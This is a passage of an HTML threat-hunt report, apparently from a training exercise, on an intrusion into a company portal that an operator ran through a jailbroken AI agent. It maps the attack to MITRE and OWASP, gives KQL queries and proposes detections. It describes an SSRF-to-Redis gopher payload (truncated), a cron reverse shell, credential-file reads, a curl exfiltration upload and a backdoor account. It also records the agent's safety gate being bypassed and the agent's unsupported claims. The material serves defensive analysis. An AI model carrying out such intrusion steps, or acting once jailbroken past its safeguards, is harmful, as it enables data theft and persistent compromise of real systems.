+</ul></section><section id="ioc-summary"><div class="section-header"><span class="section-num">07</span><h2 class="section-title">IOC Summary</h2></div><div class="expand-bar"><button type="button" class="exp" data-open="1">Expand all</button><button type="button" class="exp" data-open="0">Collapse all</button></div><details class="phase"><summary><span class="phase-title">Network Indicators</span></summary><div class="phase-body">
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Indicator</th>
+<th>Context</th>
+<th>Action</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IP</td>
+<td><code>203.0.113.87</code></td>
+<td>Exploit source and reverse shell endpoint (443)</td>
+<td><code>BLOCK</code></td>
+</tr>
+<tr>
+<td>IP</td>
+<td><code>198.51.100.210</code></td>
+<td>Exfiltration upload server (443, path <code>/upload</code>)</td>
+<td><code>BLOCK</code></td>
+</tr>
+<tr>
+<td>IP</td>
+<td><code>198.51.100.31</code>, <code>198.51.100.45</code>, <code>198.51.100.62</code></td>
+<td>Reconnaissance scanner cluster (<code>python-requests/2.31.0</code>)</td>
+<td><code>BLOCK</code></td>
+</tr>
+<tr>
+<td>URL</td>
+<td><code>https://198.51.100.210:443/upload</code></td>
+<td>Upload target</td>
+<td><code>BLOCK</code></td>
+</tr>
+</tbody>
+</table></div>
+</div></details><details class="phase"><summary><span class="phase-title">File Indicators</span></summary><div class="phase-body">
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Indicator</th>
+<th>Location</th>
+<th>Hash (SHA256)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Archive</td>
+<td><code>report.tar.gz.enc</code></td>
+<td><code>/tmp/.portal-cache/</code></td>
+<td>not captured by the collector</td>
+</tr>
+<tr>
+<td>Folder</td>
+<td><code>.portal-cache/data/</code></td>
+<td><code>/tmp/</code></td>
+<td><code>N/A</code></td>
+</tr>
+<tr>
+<td>Crontab entry</td>
+<td>Written by Redis, runs the Python shell</td>
+<td>Cron directory on <code>sc-portal01</code> (path not observed)</td>
+<td><code>N/A</code></td>
+</tr>
+<tr>
+<td>Key pair</td>
+<td><code>id_ed25519</code></td>
+<td><code>/home/svc_monitor/.ssh/</code></td>
+<td><code>N/A</code></td>
+</tr>
+</tbody>
+</table></div>
+</div></details><details class="phase"><summary><span class="phase-title">Account Indicators</span></summary><div class="phase-body">
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Account</th>
+<th>Type</th>
+<th>Action Required</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>svc_monitor</code></td>
+<td><code>Backdoor account (sudo, SSH key)</code></td>
+<td><code>Delete, check authorized_keys</code></td>
+</tr>
+<tr>
+<td><code>portal_svc</code></td>
+<td><code>Stolen service credential (database)</code></td>
+<td><code>Rotate in a planned change</code></td>
+</tr>
+<tr>
+<td><code>ci-builder</code></td>
+<td><code>Stolen service credential (registry)</code></td>
+<td><code>Rotate in a planned change</code></td>
+</tr>
+</tbody>
+</table></div>
+</div></details><details class="phase"><summary><span class="phase-title">Credential Exposure</span></summary><div class="phase-body">
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Credential</th>
+<th>Where Found</th>
+<th>Reset Required</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>portal_svc</code> database login</td>
+<td>Plain text in <code>/etc/semicrest/portal.conf</code></td>
+<td><code>YES, planned with the application</code></td>
+</tr>
+<tr>
+<td><code>ci-builder</code> registry login</td>
+<td>Plain text in <code>/etc/semicrest/portal.conf</code></td>
+<td><code>YES, planned with the CI pipeline</code></td>
+</tr>
+<tr>
+<td><code>db_admin</code> login</td>
+<td>Claimed by the agent only, no support in any log</td>
+<td><code>NO as a confirmed leak. Verify it does not exist</code></td>
+</tr>
+<tr>
+<td>Environment variables on <code>sc-portal01</code></td>
+<td><code>env</code> ran at 07:05:21, output never recorded</td>
+<td><code>YES, treat as exposed</code></td>
+</tr>
+</tbody>
+</table></div></div></details></section><section id="mitre-att-ck-summary"><div class="section-header"><span class="section-num">08</span><h2 class="section-title">MITRE ATT&amp;CK Summary</h2></div><p>Priority is how urgently the step needs a detection rule. <strong>Pyramid tier</strong> is how painful it is for the attacker to change that indicator. This table is the single source of the technique count.</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th style="text-align: right;">#</th>
+<th>Flag Name</th>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Priority</th>
+<th>Detection Status</th>
+<th>Pyramid Tier</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: right;">1</td>
+<td>Scanner IPs, recon vs Nessus</td>
+<td>Reconnaissance</td>
+<td>T1595.002</td>
+<td>Active Scanning: Vulnerability Scanning</td>
+<td>🟡 Medium</td>
+<td>Hunted only</td>
+<td>TTP (scan profile)</td>
+</tr>
+<tr>
+<td style="text-align: right;">2</td>
+<td>Self-correct</td>
+<td>Resource Development</td>
+<td>T1587.004</td>
+<td>Develop Capabilities: Exploits</td>
+<td>🟠 High</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td style="text-align: right;">3</td>
+<td>Exploit source</td>
+<td>Resource Development</td>
+<td>T1584.004</td>
+<td>Compromise Infrastructure: Server</td>
+<td>🟡 Medium</td>
+<td>Hunted only</td>
+<td>IP</td>
+</tr>
+<tr>
+<td style="text-align: right;">4</td>
+<td>Novel technique</td>
+<td>Resource Development</td>
+<td>T1588.007</td>
+<td>Obtain Capabilities: Artificial Intelligence</td>
+<td>🟠 High</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td style="text-align: right;">5</td>
+<td>Vulnerable endpoint</td>
+<td>Initial Access</td>
+<td>T1190</td>
+<td>Exploit Public-Facing Application</td>
+<td>🔴 Critical</td>
+<td>Alerted</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td style="text-align: right;">6</td>
+<td>Exploitation chain</td>
+<td>Persistence</td>
+<td>T1053.003</td>
+<td>Scheduled Task/Job: Cron</td>
+<td>🔴 Critical</td>
+<td>Hunted only</td>
+<td>Artifact</td>
+</tr>
+<tr>
+<td style="text-align: right;">7</td>
+<td>Exploitation chain</td>
+<td>Execution</td>
+<td>T1059.006</td>
+<td>Command and Scripting Interpreter: Python</td>
+<td>🔴 Critical</td>
+<td>Hunted only</td>
+<td>TTP (lineage)</td>
+</tr>
+<tr>
+<td style="text-align: right;">8</td>
+<td>Reverse shell, exfil vs HTTPS</td>
+<td>Command and Control</td>
+<td>T1071.001</td>
+<td>Application Layer Protocol: Web Protocols</td>
+<td>🟠 High</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td style="text-align: right;">9</td>
+<td>Configuration file, credentials</td>
+<td>Credential Access</td>
+<td>T1552.001</td>
+<td>Unsecured Credentials: Credentials In Files</td>
+<td>🔴 Critical</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td style="text-align: right;">10</td>
+<td>Configuration file, registry browsing</td>
+<td>Discovery</td>
+<td>T1083</td>
+<td>File and Directory Discovery</td>
+<td>🟡 Medium</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td style="text-align: right;">11</td>
+<td>Admin API response</td>
+<td>Discovery</td>
+<td>T1082</td>
+<td>System Information Discovery</td>
+<td>🟡 Medium</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td style="text-align: right;">12</td>
+<td>Database and registry credentials</td>
+<td>Defense Evasion, Persistence</td>
+<td>T1078</td>
+<td>Valid Accounts</td>
+<td>🔴 Critical</td>
+<td>Hunted only</td>
+<td>Credential</td>
+</tr>
+<tr>
+<td style="text-align: right;">13</td>
+<td>Database query discrimination</td>
+<td>Collection</td>
+<td>T1213.006</td>
+<td>Data from Information Repositories: Databases</td>
+<td>🔴 Critical</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td style="text-align: right;">14</td>
+<td>Queried tables</td>
+<td>Discovery</td>
+<td>T1087</td>
+<td>Account Discovery</td>
+<td>🟡 Medium</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td style="text-align: right;">15</td>
+<td>Staging path</td>
+<td>Collection</td>
+<td>T1074.001</td>
+<td>Data Staged: Local Data Staging</td>
+<td>🟠 High</td>
+<td>Hunted only</td>
+<td>Artifact</td>
+</tr>
+<tr>
+<td style="text-align: right;">16</td>
+<td>Staging tools</td>
+<td>Collection</td>
+<td>T1560.001</td>
+<td>Archive Collected Data: Archive via Utility</td>
+<td>🟠 High</td>
+<td>Hunted only</td>
+<td>Tool</td>
+</tr>
+<tr>
+<td style="text-align: right;">17</td>
+<td>Exfil destination</td>
+<td>Exfiltration</td>
+<td>T1567</td>
+<td>Exfiltration Over Web Service</td>
+<td>🔴 Critical</td>
+<td>Hunted only</td>
+<td>IP</td>
+</tr>
+<tr>
+<td style="text-align: right;">18</td>
+<td>Persistence</td>
+<td>Persistence</td>
+<td>T1136.001</td>
+<td>Create Account: Local Account</td>
+<td>🔴 Critical</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td style="text-align: right;">19</td>
+<td>Persistence</td>
+<td>Persistence</td>
+<td>T1098</td>
+<td>Account Manipulation</td>
+<td>🟠 High</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td style="text-align: right;">20</td>
+<td>Autonomy placement</td>
+<td>Defense Evasion</td>
+<td>T1699</td>
+<td>Direct Prompt Injection</td>
+<td>🟠 High</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+</tbody>
+</table></div>
+<h3>Coverage Snapshot</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th style="text-align: right;">Unique ATT&amp;CK IDs</th>
+<th style="text-align: right;">Alerted by existing rules</th>
+<th style="text-align: right;">Found by hunting only</th>
+<th style="text-align: right;">Not detectable (telemetry gap)</th>
+<th style="text-align: right;">New rules built</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: right;">20</td>
+<td style="text-align: right;">1</td>
+<td style="text-align: right;">19</td>
+<td style="text-align: right;">0 (but 3 observation gaps, see Telemetry Gaps)</td>
+<td style="text-align: right;">3</td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p>T1699 is listed because MITRE C0062 records it for this campaign (the operators posed as a defensive security firm). In this telemetry the only trace is <code>gate_reason</code> = <code>jailbreak</code> on every agent action; the prompt itself is not in the logs.</p>
+</blockquote>
+<h3>ATT&amp;CK Tactic Coverage</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Techniques observed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reconnaissance (TA0043)</td>
+<td>T1595.002</td>
+</tr>
+<tr>
+<td>Resource Development (TA0042)</td>
+<td>T1587.004, T1584.004, T1588.007</td>
+</tr>
+<tr>
+<td>Initial Access (TA0001)</td>
+<td>T1190</td>
+</tr>
+<tr>
+<td>Execution (TA0002)</td>
+<td>T1059.006</td>
+</tr>
+<tr>
+<td>Persistence (TA0003)</td>
+<td>T1053.003, T1136.001, T1098, T1078</td>
+</tr>
+<tr>
+<td>Defense Evasion (TA0005)</td>
+<td>T1699</td>
+</tr>
+<tr>
+<td>Credential Access (TA0006)</td>
+<td>T1552.001</td>
+</tr>
+<tr>
+<td>Discovery (TA0007)</td>
+<td>T1083, T1082, T1087</td>
+</tr>
+<tr>
+<td>Collection (TA0009)</td>
+<td>T1213.006, T1074.001, T1560.001</td>
+</tr>
+<tr>
+<td>Command and Control (TA0011)</td>
+<td>T1071.001</td>
+</tr>
+<tr>
+<td>Exfiltration (TA0010)</td>
+<td>T1567</td>
+</tr>
+</tbody>
+</table></div></section><section id="mitre-atlas-mapping"><div class="section-header"><span class="section-num">09</span><h2 class="section-title">MITRE ATLAS Mapping</h2></div><p>ATLAS is the ATT&amp;CK-style matrix for attacks on and with AI systems. In this hunt the AI sits on the attacker's side, so ATLAS describes the agent's operation, not a weakness in a SemiCrest model.</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Observation</th>
+<th>Flag</th>
+<th>ATLAS technique</th>
+<th>Evidence</th>
+<th>Fit</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>The agent was operated past its safety gate</td>
+<td>Autonomy placement</td>
+<td>AML.T0054 LLM Jailbreak</td>
+<td><code>LLMAgentLogs_CL.gate_reason</code> = <code>jailbreak</code> with <code>gate_decision</code> = <code>allow</code> on every agent action</td>
+<td>Consistent, the persona or prompt itself is not logged</td>
+</tr>
+</tbody>
+</table></div></section><section id="ttp-analysis-owasp-mapping"><div class="section-header"><span class="section-num">10</span><h2 class="section-title">TTP Analysis &amp; OWASP Mapping</h2></div><div class="expand-bar"><button type="button" class="exp" data-open="1">Expand all</button><button type="button" class="exp" data-open="0">Collapse all</button></div><p>A <strong>tactic</strong> is the attacker's goal at that stage. A <strong>technique</strong> is how they did it. A <strong>procedure</strong> is the exact implementation seen here.</p>
+<details class="phase"><summary><span class="phase-title">Tactic: Reconnaissance and Resource Development (TA0043, TA0042)</span></summary><div class="phase-body">
+<p><strong>Goal in plain English:</strong> find the way in and prepare tools.</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>What the attacker did here</th>
+<th>Why it worked</th>
+<th>Evidence (flag, table.field)</th>
+<th>Detection status</th>
+<th>Pyramid tier</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T1595.002 Vulnerability Scanning</td>
+<td>Three sources sent the same 15-path list in non-overlapping slots (30 requests each, 16 errors each)</td>
+<td>The portal answered the preview probe with 400, not 404, revealing the endpoint</td>
+<td>Flag S6.1, S6.2: <code>PortalAccessLog_CL.UrlOriginal</code> + <code>HttpStatusCode</code></td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td>T1587.004 Develop Capabilities: Exploits</td>
+<td>A working gopher payload followed the blocked file:// attempt within 18 seconds</td>
+<td>The filter blocked one scheme, not all but https</td>
+<td>Flag S1.2: <code>PortalAccessLog_CL.TimeGenerated</code></td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td>T1584.004 / T1588.007</td>
+<td>Separate infrastructure for scan, exploit and exfiltration; an AI agent as the execution engine</td>
+<td>Disposable servers and an acquired AI capability</td>
+<td>Flag S1.3, S7.3</td>
+<td>Hunted only</td>
+<td>IP, TTP</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Behavioural notes:</strong> the agent's <code>adapt_payload</code> call (06:52:31) is 1.6 seconds after the rejection.
+<strong>Defender takeaway:</strong> an allowlist of <code>https://</code> to approved domains on the preview feature would have stopped the first and the second request.</p>
+</div></details><details class="phase"><summary><span class="phase-title">Tactic: Initial Access and Execution (TA0001, TA0002)</span></summary><div class="phase-body">
+<p><strong>Goal in plain English:</strong> get code running on the portal.</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>What the attacker did here</th>
+<th>Why it worked</th>
+<th>Evidence (flag, table.field)</th>
+<th>Detection status</th>
+<th>Pyramid tier</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T1190 Exploit Public-Facing Application</td>
+<td>SSRF through <code>/api/v1/preview?url=</code> using <code>gopher://</code> to the local Redis</td>
+<td>The server fetched any URL scheme not on a blocklist and Redis was reachable on loopback</td>
+<td>Flag S1.1 to S1.4</td>
+<td>Alerted</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td>T1053.003 Cron / T1059.006 Python</td>
+<td>A root cron entry, most likely written by Redis (Redis is not logged), ran a one-line Python reverse shell</td>
+<td>Cron ran a file Redis was allowed to write as root</td>
+<td>Flag S1.4: <code>Syslog.SyslogMessage</code> (CRON), <code>DeviceProcessEvents_CL</code> (cron 4400 to python3 4401)</td>
+<td>Hunted only</td>
+<td>Artifact, TTP</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Behavioural notes:</strong> one second from accepted request to cron firing.
+<strong>Defender takeaway:</strong> alert on an interpreter whose parent is <code>cron</code> on a web-facing host (DR-01).</p>
+</div></details><details class="phase"><summary><span class="phase-title">Tactic: Credential Access, Discovery and Lateral Movement (TA0006, TA0007)</span></summary><div class="phase-body">
+<p><strong>Goal in plain English:</strong> find passwords and map the network.</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>What the attacker did here</th>
+<th>Why it worked</th>
+<th>Evidence (flag, table.field)</th>
+<th>Detection status</th>
+<th>Pyramid tier</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T1552.001 Credentials In Files</td>
+<td><code>cat /etc/semicrest/portal.conf</code> read database and registry logins</td>
+<td>Secrets stored in plain text on the portal</td>
+<td>Flag S2.1 to S2.3</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td>T1078 Valid Accounts</td>
+<td><code>portal_svc</code> to <code>sc-db01</code>, <code>ci-builder</code> to <code>sc-registry01</code>, <code>portal_svc</code> to <code>sc-admin01</code></td>
+<td>The same accounts worked from the compromised host; every connection came from PID 4401</td>
+<td>Flag S3.1 to S3.4, S8.1</td>
+<td>Hunted only</td>
+<td>Credential</td>
+</tr>
+<tr>
+<td>T1083, T1082, T1087</td>
+<td><code>find / -name "*.conf"</code>, registry browsing, admin API services and topology, user role counts</td>
+<td>Services were reachable from the portal</td>
+<td>Flag S3.2, S3.3, S3.4</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Behavioural notes:</strong> the admin API refused the secrets request (403): least privilege held there.
+<strong>Defender takeaway:</strong> move secrets out of plain-text files and give each service its own narrow account.</p>
+</div></details><details class="phase"><summary><span class="phase-title">Tactic: Collection and Exfiltration (TA0009, TA0010)</span></summary><div class="phase-body">
+<p><strong>Goal in plain English:</strong> gather data and send it out.</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>What the attacker did here</th>
+<th>Why it worked</th>
+<th>Evidence (flag, table.field)</th>
+<th>Detection status</th>
+<th>Pyramid tier</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T1213.006 Databases</td>
+<td><code>SELECT *</code> on users, projects, customers; <code>pg_shadow</code>; targeted second wave</td>
+<td>The stolen login could read every table</td>
+<td>Flag S3.1, S3.2</td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+<tr>
+<td>T1074.001 / T1560.001</td>
+<td>Hidden <code>.portal-cache</code>, <code>tar</code> then <code>gzip</code> then <code>openssl enc -aes-256-cbc</code></td>
+<td>Standard tools, encrypted to defeat inspection</td>
+<td>Flag S5.1, S5.2</td>
+<td>Hunted only</td>
+<td>Artifact, Tool</td>
+</tr>
+<tr>
+<td>T1567 / T1071.001</td>
+<td><code>curl</code> POST of the archive to <code>198.51.100.210:443/upload</code></td>
+<td>Port 443 blends with normal HTTPS</td>
+<td>Flag S5.1, S5.4</td>
+<td>Hunted only</td>
+<td>IP, TTP</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Behavioural notes:</strong> staging took 15 seconds and the upload came 13 minutes later.
+<strong>Defender takeaway:</strong> key on the process (root PID 4401, parent cron) and on a first-time destination, not on the port.</p>
+</div></details><details class="phase"><summary><span class="phase-title">Tactic: Persistence (TA0003)</span></summary><div class="phase-body">
+<p><strong>Goal in plain English:</strong> keep a way back in.</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>What the attacker did here</th>
+<th>Why it worked</th>
+<th>Evidence (flag, table.field)</th>
+<th>Detection status</th>
+<th>Pyramid tier</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T1136.001 Create Account / T1098</td>
+<td><code>svc_monitor</code> created, added to sudo, SSH key generated</td>
+<td>Root shell could create accounts freely</td>
+<td>Flag S5.3: <code>DeviceEvents_CL.ActionType</code>, <code>DeviceProcessEvents_CL.ProcessCommandLine</code></td>
+<td>Hunted only</td>
+<td>TTP</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Behavioural notes:</strong> the log shows the account being prepared, not used.
+<strong>Defender takeaway:</strong> alert on <code>useradd</code> or <code>usermod -aG sudo</code> with an interpreter parent (DR-03).</p>
+</div></details><details class="phase"><summary><span class="phase-title">Autonomy (AI-specific)</span></summary><div class="phase-body">
+<p><strong>Who was driving?</strong> A person who set a machine going. The recovered agent log (<code>session_id</code> <code>qf-c062-9e4a</code>) records 5 operator directives and 10 agent actions.</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Time (agent log, time of day)</th>
+<th>Who</th>
+<th>What</th>
+<th>Matches infrastructure?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>06:31:55</td>
+<td>Operator</td>
+<td>Initial tasking: reconnaissance and exploitation, harvest credentials, extract design data</td>
+<td>Starts the operation</td>
+</tr>
+<tr>
+<td>06:44:20 to 06:53:00</td>
+<td>Agent</td>
+<td><code>fuzz_schemes</code>, <code>adapt_payload</code>, <code>rce_confirmed</code></td>
+<td>Yes (probing from 06:44, correction at 06:52:31)</td>
+</tr>
+<tr>
+<td>06:53:03</td>
+<td>Operator</td>
+<td>Foothold confirmed: proceed with credential harvesting and lateral movement</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>07:05:33 to 07:31:06</td>
+<td>Agent</td>
+<td><code>harvest_creds</code>, <code>query_database</code>, <code>inspect_registry</code></td>
+<td><code>harvest_creds</code> yes; the <code>inspect_registry</code> claim of <code>db_admin</code> credentials is unsupported</td>
+</tr>
+<tr>
+<td>07:31:09</td>
+<td>Operator</td>
+<td>Authorise data collection from database tables and admin API enumeration</td>
+<td>Approval came 3 seconds after the unsupported claim</td>
+</tr>
+<tr>
+<td>07:48:30</td>
+<td>Agent</td>
+<td><code>extract_secrets</code>: "extracted Kubernetes secrets"</td>
+<td>No: the infrastructure shows a 403</td>
+</tr>
+<tr>
+<td>07:48:31 (two messages, 0.4 s apart)</td>
+<td>Operator</td>
+<td>Authorise documentation, staging, then exfiltration</td>
+<td>Approvals 1.5 seconds after the unsupported claim</td>
+</tr>
+<tr>
+<td>08:04:34 to 08:30:00</td>
+<td>Agent</td>
+<td><code>stage_archive</code>, <code>exfiltrate</code>, <code>persist</code></td>
+<td>Yes</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Evidence of machine speed:</strong> a payload corrected in 18 seconds, <code>cat</code>, <code>env</code> and <code>find</code> 6 seconds apart, five database statements in 9 seconds, four registry operations in about 3 seconds, <code>useradd</code> to <code>ssh-keygen</code> in 20 seconds. <strong>Evidence of human involvement:</strong> the directives above, at idle gaps of 13 to 57 minutes. <strong>Why not fully autonomous:</strong> two claims unsupported by the infrastructure (see flags S4.1 and S4.2). This matches C0062: about 80 to 90 percent of the work by the AI, with a human at four to six decision points.</p>
+</div></details><details class="phase"><summary><span class="phase-title">OWASP Mapping</span></summary><div class="phase-body">
+<blockquote>
+<p>Categories use the OWASP Top 10 (2021) names. Verify against owasp.org before publishing.</p>
+</blockquote>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Weakness observed</th>
+<th>OWASP list and category</th>
+<th>Where seen (flag)</th>
+<th>Fix</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Preview feature fetches any scheme not blocked</td>
+<td>A10 Server-Side Request Forgery</td>
+<td>S1.1, S1.2</td>
+<td>Allowlist <code>https://</code> and approved domains, block internal addresses</td>
+</tr>
+<tr>
+<td>Redis reachable and writing files as root</td>
+<td>A05 Security Misconfiguration</td>
+<td>S1.4</td>
+<td>Bind to localhost with a password, disable <code>CONFIG</code>, run as non-root</td>
+</tr>
+<tr>
+<td>Secrets in a plain-text file readable by the shell</td>
+<td>A05 Security Misconfiguration</td>
+<td>S2.1 to S2.3</td>
+<td>Move to a secrets store, narrow file permissions</td>
+</tr>
+<tr>
+<td>One account used from several hosts with wide reach</td>
+<td>A01 Broken Access Control</td>
+<td>S3.1, S8.1</td>
+<td>One account per service, least privilege</td>
+</tr>
+<tr>
+<td>Redis writes, command output and file changes not logged</td>
+<td>A09 Security Logging and Monitoring Failures</td>
+<td>S1.4, S2.4</td>
+<td>Forward Redis logs, audit writes to cron and <code>/proc/*/environ</code></td>
+</tr>
+</tbody>
+</table></div></div></details></section><section id="flag-analysis"><div class="section-header"><span class="section-num">11</span><h2 class="section-title">Flag Analysis</h2></div><div class="expand-bar"><button type="button" class="exp" data-open="1">Expand all</button><button type="button" class="exp" data-open="0">Collapse all</button></div><p>Each section opens in a collapsible block. Queries are reproduced with an explicit time interval. Flag numbers follow the exercise (S1.1 is Section 1, flag 1).</p>
+<h3>Section 1: Initial Access</h3>
+<details class="phase"><summary><span class="phase-title">Flag S1.1: Vulnerable endpoint</span><span class="sum-tags">T1190</span><span class="badge badge-critical">Critical</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Find which interface the alert fired on.</p>
+<h3>Finding</h3>
+<p>Two requests from <code>203.0.113.87</code> hit <code>/api/v1/preview</code> seconds apart. The <code>url</code> parameter carried the payload, so the preview feature fetches a server-side URL.</p>
+<h3>Evidence</h3>
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">Host</div><div class="kv-val"><code>sc-portal01</code></div></div><div class="kv-item"><div class="kv-key">Source table.field</div><div class="kv-val"><code>PortalAccessLog_CL.UrlOriginal</code></div></div><div class="kv-item"><div class="kv-key">Endpoint</div><div class="kv-val"><code>/api/v1/preview</code> (parameter <code>url</code>)</div></div><div class="kv-item"><div class="kv-key">Source IP</div><div class="kv-val"><code>203.0.113.87</code></div></div></div>
+<h3>Why It Matters</h3>
+<p>A feature that fetches any URL on the server's behalf is the classic SSRF surface, the first link of the chain.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">PortalAccessLog_CL
+| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
+| where Computer =~ &quot;sc-portal01&quot;
+| where SrcIpAddr == &quot;203.0.113.87&quot;
+| project TimeGenerated, SrcIpAddr, UrlOriginal, HttpStatusCode
+</code></pre>
+<h3>Detection Recommendation</h3>
+<p>Alert on any <code>url=</code> value on this endpoint whose scheme is not <code>https</code>. The endpoint and parameter are durable, the IP is not.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S1.2: The self-correct</span><span class="sum-tags">T1190, T1587.004</span><span class="badge badge-critical">Critical</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Work out how the attacker got past the filter.</p>
+<h3>Finding</h3>
+<p>At 06:52:30 <code>file:///etc/passwd</code> was refused (400). At 06:52:48 a <code>gopher://127.0.0.1:6379/</code> payload was accepted (200). That is 18 seconds. The filter blocked one scheme (a blocklist) instead of allowing only <code>https://</code>.</p>
+<h3>Evidence</h3>
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">Source table.field</div><div class="kv-val"><code>PortalAccessLog_CL.UrlOriginal</code>, <code>HttpStatusCode</code>, <code>TimeGenerated</code></div></div><div class="kv-item"><div class="kv-key">First attempt</div><div class="kv-val"><code>file://</code>, 400, 06:52:30</div></div><div class="kv-item"><div class="kv-key">Second attempt</div><div class="kv-val"><code>gopher://127.0.0.1:6379/_*1...FLUSHALL...SET...</code>, 200, 06:52:48</div></div><div class="kv-item"><div class="kv-key">Agent log</div><div class="kv-val"><code>adapt_payload</code> tool call 1.6 seconds after the rejection</div></div></div>
+<h3>Benign Look-Alikes Ruled Out</h3>
+<p><code>10.5.0.61</code> POST to the same endpoint with <code>https://docs.semicrest.com/datasheet.pdf</code> at 06:58:17: internal source, https, company domain. The feature working as designed.</p>
+<h3>Why It Matters</h3>
+<p>The corrected request was complete and correctly encoded for Redis. A person would need minutes to research and craft it. The 18-second gap is the first sign of an automated agent.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">PortalAccessLog_CL
+| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
+| where Computer =~ &quot;sc-portal01&quot;
+| project TimeGenerated, SrcIpAddr, HttpMethod, UrlOriginal, HttpStatusCode
+| order by TimeGenerated asc
+</code></pre>
+<h3>Screenshot</h3>
+<figure><a href="Screenshots/S1%20SSRF%20self-correct%20file%20to%20gopher.png" target="_blank" rel="noopener"><img src="Screenshots/S1%20SSRF%20self-correct%20file%20to%20gopher.png" alt="Rejected file:// then accepted gopher:// from the same source"></a><figcaption>Rejected file:// then accepted gopher:// from the same source</figcaption></figure>
+<h3>Detection Recommendation</h3>
+<p>Rule: more than one distinct URL scheme from one source to the same endpoint inside a minute, one of them rejected. Fix: allowlist <code>https</code> and approved hosts instead of blocking schemes.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S1.3: Exploit source</span><span class="sum-tags">T1584.004, T1190</span><span class="badge badge-high">High</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Identify who delivered the exploit.</p>
+<h3>Finding</h3>
+<p><code>203.0.113.87</code> sent both requests. It is separate from the reconnaissance scanners (<code>198.51.100.x</code>) and from the exfiltration server (<code>198.51.100.210</code>): scan, exploit and exfiltrate used three sets of infrastructure. It later received the reverse shell.</p>
+<h3>Evidence</h3>
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">Source table.field</div><div class="kv-val"><code>PortalAccessLog_CL.SrcIpAddr</code></div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Scenario note</div><div class="kv-val">The exploit server is the penetration-testing server the AI operated through MCP (C0062, T1584.004)</div></div></div>
+<h3>Why It Matters</h3>
+<p>An IP is the cheapest indicator to change. Block it for containment, but build the detection on behaviour.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">PortalAccessLog_CL
